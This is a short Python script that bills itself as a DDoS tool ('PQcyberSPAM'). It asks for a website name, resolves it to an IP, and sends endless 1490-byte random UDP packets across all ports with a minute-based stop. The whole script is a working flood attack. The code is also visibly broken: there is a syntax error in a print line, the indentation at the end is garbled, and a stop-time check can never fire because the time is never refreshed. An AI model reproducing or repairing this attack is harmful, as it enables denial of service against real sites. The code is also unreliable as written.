import sys
import os
import time
import socket
import random

os.system("clear")

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

sent = 0
limit = 0
app = 0
port = 0
stopminute = 0
nowminute = 0

print('##########################################')
print ('Wellcome to PQcyberSPAM softing')
print()
print ('Get SOFT')
print ('[1] - DDoS Attack http://SITE')
#   print ('[2] - SMS Bomber')
print()
print('##########################################')
print()
            # print
            # app = int(input('select a number to launch the app: '))
            # if app == 1:
print
site = input('Имя сайта: ')
ip = socket.gethostbyname(site) 

print ('Site IP: ',ip)
print()
print('##########################################')
#print
#siteport = int(input('port: '))
print()
print
limit = int(input('attack limit(minute): '))
stopminute = minute + limit
print(stopminute)
print('End site attack in: ' hour,':'minute)

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     nowminute = now.minute
     print ('Sent %s packet to %s throught port:%s'%(sent,ip,port))
     print (nowminute)
     if port == 65534:
       port = 1
     #if sent == limit:
           if nowminute == stopminute: 
          #sys.exit()
